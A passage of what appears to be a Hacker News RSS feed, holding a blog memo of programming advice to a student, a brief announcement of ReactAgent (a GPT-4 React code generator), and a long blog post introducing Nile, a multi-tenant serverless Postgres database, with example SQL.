</td><td><a href="https://blog.plover.com/2014/01/">J</a><a href="https://blog.plover.com/2014/02/">F</a><a href="https://blog.plover.com/2014/03/">M</a><a href="https://blog.plover.com/2014/04/">A</a>MJ</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2014/07/">J</a>ASO<a href="https://blog.plover.com/2014/11/">N</a><a href="https://blog.plover.com/2014/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2013/">2013</a>:
</td><td>JFMAMJ</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2013/07/">J</a>A<a href="https://blog.plover.com/2013/09/">S</a><a href="https://blog.plover.com/2013/10/">O</a>N<a href="https://blog.plover.com/2013/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2012/">2012</a>:
</td><td><a href="https://blog.plover.com/2012/01/">J</a><a href="https://blog.plover.com/2012/02/">F</a><a href="https://blog.plover.com/2012/03/">M</a>AMJ
</td></tr><tr><td>&nbsp;</td><td>J<a href="https://blog.plover.com/2012/08/">A</a>SON<a href="https://blog.plover.com/2012/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2011/">2011</a>:
</td><td>JFMA<a href="https://blog.plover.com/2011/05/">M</a><a href="https://blog.plover.com/2011/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td>JASO<a href="https://blog.plover.com/2011/11/">N</a>D
</td></tr><tr><td><a href="https://blog.plover.com/2010/">2010</a>:
</td><td><a href="https://blog.plover.com/2010/01/">J</a>FMAMJ
</td></tr><tr><td>&nbsp;</td><td>J<a href="https://blog.plover.com/2010/08/">A</a><a href="https://blog.plover.com/2010/09/">S</a><a href="https://blog.plover.com/2010/10/">O</a><a href="https://blog.plover.com/2010/11/">N</a>D
</td></tr><tr><td><a href="https://blog.plover.com/2009/">2009</a>:
</td><td><a href="https://blog.plover.com/2009/01/">J</a><a href="https://blog.plover.com/2009/02/">F</a><a href="https://blog.plover.com/2009/03/">M</a>A<a href="https://blog.plover.com/2009/05/">M</a><a href="https://blog.plover.com/2009/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2009/07/">J</a>A<a href="https://blog.plover.com/2009/09/">S</a>ON<a href="https://blog.plover.com/2009/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2008/">2008</a>:
</td><td><a href="https://blog.plover.com/2008/01/">J</a><a href="https://blog.plover.com/2008/02/">F</a><a href="https://blog.plover.com/2008/03/">M</a><a href="https://blog.plover.com/2008/04/">A</a><a href="https://blog.plover.com/2008/05/">M</a><a href="https://blog.plover.com/2008/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2008/07/">J</a>A<a href="https://blog.plover.com/2008/09/">S</a><a href="https://blog.plover.com/2008/10/">O</a><a href="https://blog.plover.com/2008/11/">N</a>D
</td></tr><tr><td><a href="https://blog.plover.com/2007/">2007</a>:
</td><td><a href="https://blog.plover.com/2007/01/">J</a><a href="https://blog.plover.com/2007/02/">F</a><a href="https://blog.plover.com/2007/03/">M</a><a href="https://blog.plover.com/2007/04/">A</a><a href="https://blog.plover.com/2007/05/">M</a><a href="https://blog.plover.com/2007/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2007/07/">J</a><a href="https://blog.plover.com/2007/08/">A</a><a href="https://blog.plover.com/2007/09/">S</a><a href="https://blog.plover.com/2007/10/">O</a><a href="https://blog.plover.com/2007/11/">N</a><a href="https://blog.plover.com/2007/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2006/">2006</a>:
</td><td><a href="https://blog.plover.com/2006/01/">J</a><a href="https://blog.plover.com/2006/02/">F</a><a href="https://blog.plover.com/2006/03/">M</a><a href="https://blog.plover.com/2006/04/">A</a><a href="https://blog.plover.com/2006/05/">M</a><a href="https://blog.plover.com/2006/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td> <a href="https://blog.plover.com/2006/07/">J</a>A<a href="https://blog.plover.com/2006/09/">S</a><a href="https://blog.plover.com/2006/10/">O</a><a href="https://blog.plover.com/2006/11/">N</a><a href="https://blog.plover.com/2006/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2005/">2005</a>: </td><td><a href="https://blog.plover.com/2005/10/">O</a><a href="https://blog.plover.com/2005/11/">N</a><a href="https://blog.plover.com/2005/12/">D</a>
</td></tr></tbody></table>
<br>
</p>



<hr>
Subtopics:


   <p>
   <img alt="" src="https://pic.blog.plover.com/buttons/mjd-universe.png">
   <a href="http://hop.perl.plover.com/"><img alt="Higher-Order Perl" src="https://pic.blog.plover.com/buttons/HOP-BUTTON.png"></a>
   <a href="http://blosxom.sourceforge.net/"><img alt="Blosxom" src="https://pic.blog.plover.com/buttons/blosxom-sux.png"></a>
   </p>

<!--  <a href="http://www.blosxom.com/"><img alt="Blosxom" rc="http://www.blosxom.com/images/pb_blosxom.gif" border="1" hspace="3" vspace="3" /></a>-->
   

<!--  <p>  </p> -->

<!--  <p><a href="http://technorati.com/claim/hzrgjnktrw">Technorati Profile</a></p> -->

  <p><span>Comments disabled</span></p>
  </td>

  <!-- main blog entry column -->
  <td>

   <br>

<span>Mon, 23 Oct 2023</span>
<p>
<a name="katara-advice" href="https://blog.plover.com/prog/katara-advice.html">Advice to a novice programmer</a>
<br>
</p><p>Katara is taking a Data Structures course this year.  The most recent
assignment gave her a lot of trouble, partly because it was silly and
made no sense, but also because she does not yet know an effective
process for writing programs, and the course does not attempt to teach
her.  On the day the last assignment was due I helped her fix the
remaining bugs and get it submitted.  This is the memo I wrote to her
to memorialize of the important process issues that I thought of
while we were working on it.</p>

<hr>

<ol>
<li><p>You lost a lot of time and energy dealing with issues like: Using
<code>vim</code>; copying files back and forth with scp; losing the network
connection; the college shared machine is slow and yucky.</p>

<p>It's important to remove as much friction as possible from your
basic process.  Otherwise it's like trying to cook with dull knives
and rusty pots, except worse because it interrupts your train of
thought.  <strong>You can't do good work with bad tools.</strong></p>

<p>When you start the next project, start it in VScode in the
beginning. And maybe set aside an hour or two before you start in
earnest, just to go through the VSCode tutorial and familiarize
yourself with its basic features, without trying to do that at the
same time you are actually thinking about your homework.  This will
pay off quickly.</p></li>
<li><p>It's tempting to cut corners when writing code.  For example:</p>

<ol>
<li><p>It's tempting to use the first variable of function name you
think of instead of taking a moment to think of a suggestive
one. You had three classes in your project, all with very
similar names.  You might imagine that this doesn't matter, you
can remember which is which.  But remembering imposes a tiny
cost every time you do it.  These tiny costs seem
insignificant.  But they compound.</p></li>
<li><p>It's tempting to use a short, abbreviated variable or method
name instead of a longer more recognizable one because it's
quicker to type.  Any piece of code is read more often than it
is written, so that is optimizing in the wrong place. You need
to optimize for quick and easy reading, at the cost of slower
and more careful writing, not the other way around. </p></li>
<li><p>It's tempting to write a long complicated expression instead of
two or three shorter ones where the intermediate results are
stored in variables.  But then every time you look at the long
expression you have to pause for a moment to remember what is
going on. </p></li>
<li><p>It's tempting to repeat the same code over and over instead of
taking the time to hide it behind an interface.   For example
your project was full of <code>array[d-1900]</code> all over.  This minus-1900
thing should have been hidden inside one of the classes (I
forget which).  Any code outside that had to communicate with
this class should have done so with full year numbers
like 1926. That way, when you're not in that one class, you can
ignore and forget about the issue entirely.  Similarly, if code
outside a class is doing the same thing in more than once place,
it often means that the class needs another method that does
that one thing.  You add that method, and then the code outside
can just call the method when it needs to do the thing.  You
advance the program by extending the number of operations it can
perform without your thinking of them. </p></li>
<li><p>If something is messy, it is tempting to imagine that it doesn't
matter.  It does matter.  Those costs are small but compound.
Invest in cleaning it up messy code, because if you don't the
code will get worse and worse until the mess is a serious
impediment. This is like what happens when you are cooking if
you don't clean up as you go. At first it's only a tiny
hindrance, but if you don't do it constantly you find yourself
working in a mess, making mistakes, and losing and breaking
things. </p></li>
</ol></li>
<li><p>Debugging is methodical.  Always have clear in your mind what
question you are trying to answer, and what your plan is for
investigating that question.  The process looks like this: </p>

<ol>
<li><p>I don't like that it is printing out 0 instead of 1.  Why is it
doing that?  Is the printing wrong, or is the printing correct but
the data is wrong? </p></li>
<li><p>I should go into the function that does the printing, and print
out the data in the simplest way possible, to see if it is
correct. (If it's already printing out the data in the simplest
way possible, the problem must be in the data.)</p></li>
<li><p>(Supposing that the it's the data that is bad) Where did the bad
data come from?  If it came from some other function, what
function was it?  Did that function make up the wrong data from
scratch, or did it get it from somewhere else?</p>

<p>If the function got the data from somewhere else, did it pass it
along unchanged or did it modify the data?  If it modified the
data, was the data correct when the function got it, or was it
already wrong?</p></li>
</ol>

<p>The goal here is to point the Finger of Blame: What part of the
code is really responsible for the problem? First you accuse the
code that actually prints the wrong result. Then that code says
“Nuh uh, it was like that when I got it, go blame that other guy
that gave it to me.”  Eventually you find the smoking gun.</p>

<p>Novice programmers often imagine that they can figure out what is
wrong from looking at the final output and intuiting the solution
Sherlock Holmes style. This is mistaken.  <em>Nobody</em> can do
this.  Debugging is an engineering discipline:  You come up with a
hypothesis, then test the hypothesis.  Then you do it again.</p></li>
<li><p>Ask Dad for assistance when appropriate.  I promise not to do
anything that would violate the honor code.</p></li>
</ol>

<hr>

<p>Something we discussed that I forgot to include in the memo that we
discussed is: After you fix something significant, or add significant
new functionality, make a checkpoint copy of the entire source code.
This can be as simple as simply copying it all into separate folder.
That way, when you are fixing the <em>next</em> thing, if you mess up and
break everything, it's easy to get back to a known-good state.  The
computer is really clumsy to use for many tasks, but it's just great
at keeping track of information, so exploit that when you can.</p>

<p>I think CS curricula should have a class that focuses specifically on
these issues, on the matter of <em>how do you actually write software?</em></p>

<p>But they never do.</p>




<p>
<i>[<a href="https://blog.plover.com/prog">Other articles in category /prog</a>] 
<a href="https://blog.plover.com/prog/katara-advice.html">permanent link</a></i>
</p>

<br>

  </td>

 </tr>

</tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ReactAgent: LLM Agent for React Coding (122 pts)]]></title>
            <link>https://reactagent.io/</link>
            <guid>38014835</guid>
            <pubDate>Wed, 25 Oct 2023 16:46:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://reactagent.io/">https://reactagent.io/</a>, See on <a href="https://news.ycombinator.com/item?id=38014835">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<h2><a href="https://reactagent.io/#reactagent-v010">ReactAgent v0.1.0</a></h2>
<p>I've been working in the couple of months on an experiment, trying to make GPT-4 much more useful for web development / React, writing production code that is relevant to any repository without copypasta from ChatGPT or having small snippets of auto-complete from Copilot that are not in your context.
The agent is taking a user story text and generating and composing multiple react components to generate the relevant screens, based on atomic design principles, with Typescript, TailwindCSS and RadixUI.</p>
<p>It is still experimental but very interesting results,
It is completely open-sourced, looking for contributors!</p>
<h2 id="-demo"><a href="https://reactagent.io/#-demo">👨‍💻 Demo</a></h2>

<h2 id="-features"><a href="https://reactagent.io/#-features">🚀 Features</a></h2>
<ul>
<li>Generate React Components from user stories</li>
<li>Compose React Components from existing components</li>
<li>Use a local design system to generate React Components</li>
<li>Use React, TailwindCSS, Typescript, Radix UI, Shandcn UI</li>
<li>Built with Atomic Design Principles</li>
</ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nile: Serverless Postgres for modern SaaS (165 pts)]]></title>
            <link>https://www.thenile.dev/blog/introducing-nile</link>
            <guid>38014812</guid>
            <pubDate>Wed, 25 Oct 2023 16:45:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thenile.dev/blog/introducing-nile">https://www.thenile.dev/blog/introducing-nile</a>, See on <a href="https://news.ycombinator.com/item?id=38014812">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I am thrilled to announce Nile, a serverless Postgres database designed for modern SaaS applications. Modern SaaS applications are multi-tenant. We’re the first database that virtualizes tenants into the database. This enables seamless tenant isolation, per-tenant backups, and placement on multi-tenant or dedicated infrastructure, anywhere on the planet. You can do all this with the experience of a single Postgres! You don’t have to manage multiple databases, build complex permissions for isolation, or write buggy scripts to read specific tenant data from backups. On top of the tenant model, we provide opt-in user management capabilities, customer-specific vector embeddings, and instant tenant admin dashboards. You can do all of this with very little code. Moreover, Nile's Postgres is built for the cloud, enabling effortless scaling and a true serverless experience. You can <a href="https://www.thenile.dev/">sign up for our waitlist</a> today to try it out.</p>
<p>Before Nile, I spent six years at Confluent, helping transform the company from primarily on-premise to a successful global SaaS company. Through this journey, I learned the challenges of launching and scaling a SaaS product to thousands of customers and tens of thousands of users. We spent significant time managing and isolating tenants, supporting different tenant deployment models, dealing with long downtimes to restore tenant data from backups, and optimizing per-tenant performance. We also had to build the organization and user management capabilities, store and move data to different parts of the company, track usage, bill individual customers, and handle many other SaaS problems. When we spoke to many other companies from different verticals, the problems were similar. All these problems in building SaaS were around data, but the database had little to offer.</p>
<p>We started thinking about what an ideal database for SaaS will look like. What foundational elements would it require? How can we create a fully integrated solution that simplifies the development and scaling of SaaS while also offering the flexibility for developers to integrate with their preferred tools? We picked Postgres as our foundational database. We built tenant virtualization into it, allowing many virtual tenant databases to be placed on physical Postgres databases. We built a single database experience to interact with all these virtual tenant DBs. This was a powerful primitive that provided world-class developer experience and helped solve all the tenant management problems. These virtual tenant DBs are isolated, have their own backups, can be placed on multi-tenant or dedicated infrastructure, and can be deployed to any location worldwide.</p>
<p>On top of this basic foundation of tenants, we also built the concept of users and their relationship with the tenants. The authentication and authorization semantics execute on top of this, providing an impregnable level of security for tenants and users. Storing and querying vector embeddings per tenant becomes trivial. They can now be placed closer to the tenant and scale indefinitely when the index size becomes large and resource-consuming. Finally, the database gives out-of-the-box customer admin dashboards to understand and debug issues with tenant and user growth, insights into per-tenant performance, and management controls to perform administrative operations on tenants and users. Finally, the database is built to be serverless and leverage cloud-native solutions. This database, built from first principles, significantly simplifies the development and scaling of SaaS.</p>
<p>We will go deeper to understand what SaaS is, what it means to say they are modern, the current challenges in building them, and finally, what choices and tradeoffs we made in building the database for modern SaaS.</p>
<h2 id="what-makes-saas-modern-and-why-is-it-hard-to-build">What makes SaaS modern, and why is it hard to build?</h2>
<p>SaaS is a pretty overloaded term at this point, and it would be useful to specify how we define it. We define SaaS as any application that’s multi-tenant. A tenant can be a company, an organization, or a workspace in your product that contains a group of users. Here are a few examples of SaaS products and how tenants and users map to them:</p>
<ol>
<li>GitHub helps a group of developers manage and deploy their code. Each Github organization is a tenant, and the developers within those organizations are users.</li>
<li>Salesforce or Hubspot helps sales reps manage their leads. Each company is a tenant, and the users are the sales reps.</li>
<li>Ring is a home security company that provides alarm services to different households. Each household is a tenant, and people living in a house using their service are users.</li>
<li>Toast is a platform to help build software for restaurants. The restaurants are tenants, and the employees of the restaurants are the users.</li>
</ol>
<p>It is clear from these examples that SaaS is a delivery mechanism and will be leveraged by every vertical, including technology, hardware, manufacturing, industrial, legal, etc. Our insight is that 95% of companies fall into this category, and there’s a massive opportunity to simplify the life of developers building these products.</p>
<p>We've spent years building and talking to SaaS companies identifying the core principles of modern SaaS. They're tenant-centric, secure, globally deployed and scalable, fast and responsive, and provide AI-native experiences. Secondary values like data-centricity, real-time, collaboration and offline mode, and monetization are increasingly important. Let's examine them in more detail based on our experience.</p>
<h3 id="customer-or-tenant-centric">Customer or tenant-centric</h3>
<p>A SaaS application provides services to multiple tenants or organizations. Users can create new organizations and get invited to existing ones. They can access the organization irrespective of where they are in the world. One organization's data is perfectly isolated from the other. In addition, you want the performance of one tenant not to affect the other tenants.</p>
<p>There are many other considerations:</p>
<ul>
<li>Where is the tenant’s data located?</li>
<li>What happens when a tenant's data is deleted?</li>
<li>How long will you keep data backups for each tenant?</li>
<li>How can you restore a specific tenant’s data?</li>
<li>How many tenants can you support?</li>
<li>What are the compliance needs for each customer, etc?</li>
</ul>
<p><img src="https://www.thenile.dev/blog/github_organization.png" alt="“Github Organization”"></p>
<p><strong>Everything about tenant management is hard.</strong> You typically start with a single database and place all the tenants on it. You tackle data isolation between tenants by implementing brittle permission logic at the application level or complex, hard-to-debug, row-level security policies in databases like Postgres. You turn on daily backups but have little idea how to restore data for specific tenants when customers lose data. You end up writing some hacky scripts that are slow and buggy to parse through the backups and extract the tenant data. Once the application has users, you run into your first performance issue. Some tenants are pushing more load, and others have large datasets causing queries to take more resources. This impacts other customers as well. You need help determining which customer is causing the impact and which ones are being impacted. To solve this, you migrate some tenants to dedicated databases, which requires building metadata and sharding logic at the application layer to manage all this. Schema changes, rollouts, monitoring, and developer experience become more complex. This was our story and every other SaaS company's story.</p>
<h3 id="secure-at-every-step">Secure at every step</h3>
<p>Modern SaaS is all about being secure by default. The data that belongs to one tenant cannot be exposed to another tenant under any circumstances. This is commonly referred to as tenant data isolation. Users should only be able to see the data of tenants to whom they have access. Most applications need to provide modern authentication support, such as social logins and enterprise logins. There has to be support for a fine-grained permission model for users within a tenant. The same user can have different permission policies across different tenants.</p>
<p><strong>These security needs seem simple but are complex to get right for a multi-tenant application in practice.</strong> Most authentication solutions focus on only users and leave developers to think about tenants and the interaction between users and tenants. Organization management is an entire suite of problems that needs deep coordination with the tenant's data in the database. One other critical decision that needs to be made is where the user data resides. Ideally, the primary database should be the source of truth for user data. If not, you must figure out how to sync the data between a third-party service and your primary database. This is a hard problem in distributed systems. Synchronizing user data from a third-party service requires a reliable way to copy it to the primary database, even when failures happen. This cannot be accomplished by stateless event services like webhooks, where you can lose data. You need a reliable replayable event stream to synchronize it. Even with that, you have to deal with eventual consistency in your application. Another option is a two-phase commit between the database and the external service, which is impractical. The cleanest approach is to build auth on top of your source of truth database.</p>
<h2 id="globally-available"><strong>Globally available</strong></h2>
<p>All SaaS companies want to be global from day one. At the same time, customers expect great performance and want their compliance needs to be satisfied.</p>
<p><strong>Providing low latency globally is hard because you need more than optimizing the database performance alone.</strong> The last mile of receiving the response from the server to the client constitutes a significant part of the latency. For example, the network latency between Sydney, Australia, and New York, USA, is around 200 ms on average. This is probably 10x more than the server-side latency of the database. The only solution is to place the data closer to the tenant.
<img src="https://www.thenile.dev/blog/latency_graph.png" alt="“Latency Graph&quot;">
<strong>Achieving compliance requirements in different countries is equally hard, and it also needs data to be stored locally in the country where the application is accessed.</strong> This, again, requires managing multiple databases distributed across the globe. Most companies lose critical business because they cannot provide this capability.</p>
<p>Creating and managing multiple databases across different parts of the globe poses many challenges. This is hard as it creates challenges with schema migrations, is expensive to operate, and requires complex sharding and client-side routing. Developers should be abstracted from these problems and spend their time on the core business logic.</p>
<h2 id="ai-native-experience">AI-native experience</h2>
<p>With the rise of GPT and other open-source large language models, AI-native applications have gained massive traction. Instead of AI being a separate vertical, AI will become more immersive in interacting with SaaS applications. For example, GitHub Copilot provides a seamless experience for developers to use as a coding assistant. Notion provides an AI assistant that helps to write documents, rephrase existing writeups, and summarize long articles (like this one). Hubspot provides a personal chatbot for salespeople to have conversations about their leads and pipelines. It is obvious from these examples where this is heading. New product designs will have AI built in from the start.</p>
<p><strong>The difficulty of building the AI infrastructure for SaaS is that you cannot use the large language models directly.</strong> They are trained on public data and will typically provide incorrect results. They need tenant-specific data to give relevant results. In addition, there are compliance and security issues with sharing all the private data of tenants to a large language model. This requires building architectures like RAG (more about this later) that require creating tenant-specific vector embeddings, storing them, and augmenting the LLM prompt with the tenant context. This will help with avoiding the hallucination problem and also keep the data secure. The latency of querying these embeddings is another challenge, and network latency from the user to the database will further exacerbate it. Finally, vector indexes like HNSW take significant resources and need horizontal scaling if the embeddings grow fast.</p>
<h2 id="highly-available-and-scalable">Highly available and scalable</h2>
<p>Everyone wants their application to be highly available. SaaS applications used to have weekend maintenance schedules to upgrade the database. Some applications still do! This is no longer acceptable for most users. The expectation is to have 99.99 percentile availability. Also, as the application scales, users want things to work as they used to. They don’t want any interruption in service or any performance degradation.</p>
<p><strong>Building a fully automated technology to manage tenant health proactively is not trivial.</strong> You have a service impact if you cannot do zero downtime upgrades. Similarly, you would have customer impact when it takes too long to restore specific tenant data from backups, or developers are manually trying to add more capacity due to a sudden spike in workload or lack of isolation.</p>
<p>In addition to these five principles, modern SaaS also has a few other considerations that are quickly becoming standard.</p>
<p><strong>Data-centric</strong></p>
<p>SaaS applications can be enhanced by providing valuable data insights to the users through the application. Building these data-centric experiences is still a challenge for front-end engineers.</p>
<p><strong>Real-time</strong></p>
<p>This falls into two categories: pushing data as they happen to the application and executing complex business workflows as events happen. Building these flows and connecting all these systems require multiple moving parts today.</p>
<p><strong>Collaborative and offline mode</strong></p>
<p>Applications like Figma and Notion have a collaborative experience built into the product. In addition, you can work offline and sync your data later if you don’t have an internet connection. Techniques like CRDTs needed to solve this are not easy to use.</p>
<p><strong>Monetizable</strong></p>
<p>There is a big shift towards usage-based billing from just charging for the number of seats, especially in these market conditions. The complexity of collecting usage and billing on it is not easy.</p>
<h2 id="designing-a-database-from-first-principles-for-modern-saas">Designing a database from first principles for modern SaaS</h2>
<p>We had a few key criteria that we wanted to take into consideration when we designed the database. We had to pick a good relational database that was highly performant, and extensible with growing popularity. We wanted to consider supporting multiple tenants and how the experience can still be like a single database. The ability to place tenants anywhere on the planet while not losing any of the benefits of a single database in one location was critical. On top of the tenant model, we wanted to design a foundational user model to help support all the user management capabilities. We also had to think about how we will enable vector embedding per tenant and how to support scaling them. Finally, the ability to scale instantaneously and reduce the cost of storage was key factors.</p>
<h3 id="postgres">Postgres</h3>
<p>We needed to pick a database we would build our tooling around, and the obvious choice was Postgres. Postgres is a world-class database that is winning in the OLTP space. This trend will continue, and making Postgres easy for building SaaS is the best way for us to have the maximum impact. In my opinion, one of the biggest reasons for Postgres's success is its wide suite of features and extension flexibility. This is a great foundation to build the right tooling around it, making it world-class for SaaS. A solution with Postgres should provide a fully integrated experience while preserving the complete flexibility and extensibility of Postgres. It should also work well with Postgres’s vast tooling ecosystem.
<img src="https://www.thenile.dev/blog/database_growth.png" alt="“Postgres Growth”"></p>
<h3 id="built-in-tenant-virtualization">Built-in tenant virtualization</h3>
<p>The most foundational element in SaaS is a tenant. It makes a lot of sense to build this core concept into the database. Imagine having a lot of virtual tenant databases that can be co-located on one physical Postgres (multi-tenant) for better cost, and some of them can be placed on a dedicated database for better isolation. The virtual tenant DBs can be located anywhere on the planet for low latency or compliance. The client can route to the right tenant seamlessly without routing logic in the application.</p>
<p>Isolating tenants into their own virtual DBs is great, but you will also want to be able to share data across tenants where it makes sense. Backups should be available for each tenant, and it should be possible to restore them instantaneously. Schema changes should be applied seamlessly across all the tenant DBs, and it should also be possible to do staged rollouts for different tenant tiers. While supporting all this, all the standard SQL capabilities should work across the tenants for admin operations. All the standard Postgres tooling should work. You want the experience of a single Postgres! This sounds like magic, and we can make this magic a reality.</p>
<p>The experience would be something as follows:</p>
<p><strong>Creating a new virtual tenant DB is as simple as a standard insert into the tenant's table</strong>. By default, the tenant will get created on a multi-tenant Postgres in the default region. You should be able to specify any location in the world or the infrastructure type if you want a dedicated Postgres for a tenant (more on this in the next section).</p>
<pre><code><span>-- create a record for the first customer</span>
<span>insert</span> <span>into</span> tenants (name) <span>VALUES</span> (<span>'customer1'</span>);
</code></pre>
<p><strong>Creating a new table for each tenant should be like standard table creation</strong>, and the database should ensure all the virtual tenant DBs get the schema changes applied to them. Let us call them tenant-aware tables.</p>
<pre><code><span>-- creating an employee table that is tenant aware</span>
<span>create</span> <span>table</span> employees (
  tenant_id uuid,
  id <span>integer</span>,
  name text,
  age <span>integer</span>,
  address text,
  start_date <span>timestamp</span>,
  title text,
  <span>CONSTRAINT</span> FK_tenants <span>FOREIGN</span> KEY(tenant_id) <span>REFERENCES</span> tenants(id),
  <span>CONSTRAINT</span> PK_employee <span>PRIMARY</span> KEY(tenant_id,id));
</code></pre>
<p>With the table in place, you can add rows for a specific tenant. Let us say tenant “customer 1” has a few employees that must be added to the system.</p>
<pre><code><span>-- adding employees for customer 1</span>
<span>insert</span> <span>into</span> employees (tenant_id, id, name, age, address, start_date, title)
<span>values</span>
  (<span>'018ac98e-b37a-731b-b03a-6617e8fd5266'</span>,<span>1345</span>,<span>'Jason'</span>,<span>30</span>,<span>'Sunnyvale,California'</span>,<span>'2016-12-22 19:10:25-07'</span>,<span>'software engineer'</span>),
  (<span>'018ac98e-b37a-731b-b03a-6617e8fd5266'</span>,<span>2423</span>,<span>'Minnie'</span>,<span>24</span>,<span>'Seattle,Washingtom'</span>,<span>'2018-11-11 12:09:22-06'</span>,<span>'sales engineer'</span>),
  (<span>'018ac98e-b37a-731b-b03a-6617e8fd5266'</span>,<span>4532</span>,<span>'Shiva'</span>,<span>32</span>,<span>'Fremont, California'</span>,<span>'2019-09-05 04:03:12-05'</span>,<span>'product manager'</span>);
</code></pre>
<p>Now, let us assume a second tenant, “customer 2” needs to be added to the system, and a few employees are added to this new tenant. This would again create another virtual tenant DB. The inserts will route to the right virtual tenant DB, but the experience will be like simply inserting into the employee's table.</p>
<pre><code><span>-- create the second customer</span>
<span>insert</span> <span>into</span> tenants (name) <span>VALUES</span> (<span>'customer2'</span>);

<span>-- insert employees for the second customer</span>
<span>insert</span> <span>into</span> employees (tenant_id, id, name, age, address, start_date, title)
<span>values</span>
  (<span>'018aca35-b8c4-7674-882c-30ae56d7b479'</span>,<span>5643</span>,<span>'John'</span>,<span>36</span>,<span>'London,UK'</span>,<span>'2017-12-12 19:10:25-07'</span>,<span>'senior software engineer'</span>),
  (<span>'018aca35-b8c4-7674-882c-30ae56d7b479'</span>,<span>1532</span>,<span>'Mark'</span>,<span>27</span>,<span>'Manchester,UK'</span>,<span>'2022-10-10 12:09:22-06'</span>,<span>'support engineer'</span>),
  (<span>'018aca35-b8c4-7674-882c-30ae56d7b479'</span>,<span>8645</span>,<span>'Sam'</span>,<span>42</span>,<span>'Liverpool,UK'</span>,<span>'2015-08-04 04:03:12-05'</span>,<span>'product manager'</span>);
</code></pre>
<p><strong>Directing queries to a specific tenant DB and getting full data isolation should be as easy as specifying the tenant ID in the session context</strong> . The client library can even abstract this by invoking this for you, depending on what tenant_id is trying to access data. This should all work out of the box without struggling with complex permissions, managing multiple databases, or dealing with error-prone row-level security policies.</p>
<pre><code><span>-- set the session context to a specific tenant</span>
<span>-- who needs to be isolated.</span>
<span>set</span> nile.tenant_id <span>=</span> <span>'018ac98e-b37a-731b-b03a-6617e8fd5266'</span>;

<span>select</span> <span>*</span> <span>from</span> employees
</code></pre>

<p><strong>The best part is you should still be able to query across the tenant DBs like a
standard table if you don’t specify any context.</strong></p>
<pre><code><span>select</span> <span>*</span> <span>from</span> employees
</code></pre>

<p>While there’s a need for virtual tenant DBs that isolate data, there’s also a need
to <a href="https://www.thenile.dev/docs/tenant-sharing">share data across tenants</a>. It should
be easy to create shared tables that can be accessed by/[across] all tenants and
are globally available. All standard queries should work seamlessly both on tenant-aware
and shared tables</p>
<pre><code>
<span>-- list of flights that a corporate travel booking site can use to share across all the tenants.</span>
<span>-- employees in different tenants can view these flight data to book tickets</span>
<span>create</span> <span>table</span> flights (
  id <span>integer</span> <span>PRIMARY</span> KEY,
  name text,
  from_location text,
  to_location text,
  departure_time <span>TIMESTAMP</span>,
  arrival_time <span>TIMESTAMP</span>
);

</code></pre>
<h3 id="global-and-flexible-tenant-placement">Global and flexible tenant placement</h3>
<p>When building a modern SaaS application, the critical factors that need to be considered are latency, performance isolation, compliance, and cost. The capability of a database to place tenants has a significant impact on achieving this balance.</p>
<p>Placement can be of two types:</p>
<p><strong>Regional placement</strong></p>
<p>You want to place individual tenants (customers) in different regions worldwide for compliance or latency reasons. You should be able to create the tenant database in any available location without worrying about the number of databases or the operational complexity.</p>
<pre><code><span>insert</span> <span>into</span> tenants (name, region)
<span>values</span> (<span>'customer 1'</span>, <span>'aws-us-east1'</span>);

<span>insert</span> <span>into</span> tenants (name, region)
<span>values</span> (<span>'customer 2'</span>, <span>'aws-eu-west1'</span>);
</code></pre>
<p><strong>Infrastructure placement</strong></p>
<p>You will want to place tenants in a multi-tenant or dedicated physical database. The decision for this will depend on the customer's needs, cost, and level of isolation needed. Typically, you would start to place all your customers in a multi-tenant database and then have the need to place some tenants on dedicated physical databases.</p>
<pre><code><span>insert</span> <span>into</span> tenants (name, region, deployment_mode)
<span>values</span> (<span>'customer 2'</span>, <span>'aws-us-east1'</span>, <span>'dedicated'</span>);
</code></pre>
<p>The client should be able to route to the right tenant without any work from the user. Also, while providing all the placement flexibility, the magic lies in providing the ability to manage all these tenants in different locations and placements like a single Postgres instance. Here are a couple of examples where this will be useful:</p>
<p>Make schema changes once, and the database should apply the change across all the virtual tenant DBs</p>
<pre><code><span>-- the bookings table where each row represents a single booking</span>
<span>-- for a specific employee within a customer/tenant</span>
<span>create</span> <span>table</span> bookings (
  tenant_id uuid,
  booking_id <span>integer</span>,
  employee_id text,
  flight_id <span>integer</span>,
  total_price <span>float</span>,
  <span>PRIMARY</span> KEY(tenant_id,booking_id));
</code></pre>
<p>Query across tenants for insights like a single database</p>
<pre><code><span>-- Calculates the total no of candidates per tenant that have</span>
<span>-- applied for a job for a recruiting product. Can be used to define</span>
<span>-- active tenants</span>
<span>select</span> t1.id <span>as</span> customer_id,t1.name <span>as</span> customer_name,
<span>count</span>(c1.id) <span>as</span> no_of_candidates <span>from</span> candidates c1
<span>right</span> <span>join</span> tenants t1 <span>on</span> c1.tenant_id<span>=</span>t1.id <span>group</span> <span>by</span> t1.id,t1.name;
</code></pre>
<h3 id="first-class-support-for-users">First-class support for users</h3>
<p>The first basic primitive of a database built for SaaS is tenants. The second is users. Managing users in the context of tenants is complex, and having built-in support will make application development significantly faster. In addition, it will help to store user data in the database with strong consistency and correctness. Authentication should provide a suite of tools that makes it easy to drop in a form to get end-to-end authentication supported for tenants and users in minutes. This should support the entire lifecycle of tenant or organization management, including inviting users to an organization, deleting an organization that soft deletes the tenants in the underlying database, and providing overrides for each tenant to configure custom authentications.
